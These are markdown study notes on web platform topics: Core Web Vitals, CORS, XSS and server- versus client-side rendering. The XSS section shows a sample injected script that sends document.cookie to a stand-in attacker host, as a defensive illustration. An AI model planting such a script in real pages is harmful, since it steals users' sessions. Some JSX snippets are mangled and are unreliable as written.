# Web Platform

<details>
<summary>Core Web Vitals (LCP, CLS, INP)</summary>

### - LCP — Largest Contentful Paint

Measures loading performance — how long until the largest visible element renders.

```text
Good      Needs work    Poor
≤ 2.5s    2.5s – 4s    > 4s
```

The "largest element" is typically a hero image, `<h1>`, or above-the-fold block of text. Chrome measures whichever element is largest at the time of load.

- Common causes of poor LCP:
  - Slow server response (TTFB)
  - Render-blocking CSS/JS
  - Unoptimized images
  - No preloading of critical assets

How to fix:

```html
<!-- Preload the LCP image — tells browser to fetch it immediately -->
<link rel="preload" as="image" href="/hero.jpg" />

<!-- Use modern formats -->
<img src="/hero.webp" fetchpriority="high" />

<!-- Next.js — priority prop does this automatically -->
<image src="/hero.jpg" priority />
```

### - CLS — Cumulative Layout Shift

Measures **visual stability** — how much the page unexpectedly shifts during load.

```text
Good      Needs work    Poor
≤ 0.1     0.1 – 0.25   > 0.25
```

- Common causes:
  - Images without explicit dimensions
  - Ads or embeds with no reserved space
  - Dynamically injected content above existing content
  - Web fonts causing FOUT (flash of unstyled text)

- How to fix:

```html
<!-- Always declare width and height — browser reserves space -->
<img src="/photo.jpg" width="800" height="600" />

<!-- Reserve space for dynamic content -->
<div style="min-height: 250px">
  <Ad />
  <!-- won't shift content when it loads -->
</div>
```

```css
/* Prevent font shift */
@font-face {
  font-family: "Inter";
  font-display: optional; /* don't swap if font is late */
}
```

### - INP — Interaction to Next Paint

Replaced FID (First Input Delay). Measures **overall interaction responsiveness** — the time from any user interaction (click, tap, keypress) to when the browser paints the response.

```text
Good      Needs work    Poor
≤ 200ms   200 – 500ms  > 500ms
```

- Common causes of poor INP:
  - Long JavaScript tasks blocking the main thread
  - Heavy event handlers
  - Forced synchronous layouts
  - Too much work happening on interaction
    <!--  -->
    </details>

<details>
<summary>CORS — Cross-Origin Resource Sharing</summary>

```text
https://app.example.com:443/path
│       │               │
scheme  hostname        port

All three must match — any difference = different origin
```

CORS is the mechanism that lets servers **explicitly opt in** to cross-origin requests.

CORS is entirely a browser enforcement mechanism. Server-to-server requests are never affected by CORS — it only applies to browser-initiated cross-origin requests. This is why you can call any API from Postman or curl without CORS issues.

</details>

<details>
<summary>XSS — Cross-Site Scripting</summary>

An attacker injects malicious scripts into your page that execute in other users' browsers — stealing cookies, session tokens, or performing actions as the victim.

```html
// User submits this as their "bio": ">
<script>
  fetch("https://evil.com?c=" + document.cookie);
</script>

// If you render it unescaped:
<div>{user.bio}</div>
// ❌ script executes for every viewer
```

How to prevent:

```html
// ✅ React escapes by default — this is safe
<div>{user.bio}</div>
// renders as text, not HTML // ❌ dangerouslySetInnerHTML bypasses escaping —
never use with user input
<div dangerouslySetInnerHTML="{{" __html: user.bio }} />

// If you must render HTML — sanitize first import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML="{{" __html: DOMPurify.sanitize(user.bio) }} />
```

</details>

<details>
<summary>SSR vs CSR in terms of Web Vitals</summary>

**SSR (Server-Side Rendering)** sends fully formed HTML from the server, giving superior initial load metrics. **CSR (Client-Side Rendering)** sends a minimal HTML shell and renders everything via JavaScript in the browser, excelling at post-load interactivity.

### Key Differences in Web Vitals

| Metric | SSR | CSR |
|--------|-----|-----|
| **FCP** | Very fast — browser receives ready-to-render HTML | Slow — must download and execute JS before painting |
| **LCP** | Generally faster — main content rendered on the server | Dependent on network speed and JS bundle size |
| **INP** | Slight delay during hydration, but generally fast | Excellent for subsequent interactions — app is already loaded |
| **CLS** | Good if images/elements have specified sizes — content arrives complete | Can be high if content pops in dynamically after JS execution |

### When to Choose

- **SSR** — Content-heavy sites, blogs, e-commerce, or when SEO is a priority
- **CSR** — Highly interactive SPAs or private dashboards where SEO doesn't matter

### Hybrid Approach

Modern frameworks (Next.js, Nuxt) combine both: SSR for the initial load and CSR for subsequent interactivity.

```text
First request → Server renders full HTML (fast FCP/LCP)
Hydration      → JS attaches to make page interactive
Navigation     → Client-side routing (instant transitions, great INP)
```

</details>
